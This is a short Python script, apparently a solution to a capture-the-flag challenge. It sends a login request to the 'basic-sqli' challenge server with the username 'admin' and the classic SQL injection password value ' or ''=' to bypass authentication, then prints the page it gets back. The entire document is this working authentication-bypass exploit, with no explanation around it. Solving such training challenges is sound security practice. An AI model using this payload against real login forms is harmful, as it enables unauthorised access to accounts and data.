import requests as r

url = 'http://basic-sqli.challs.olicyber.it/'
print(r.post(
    url,
    data={'username': 'admin', 'password': "' or ''='"}
).text)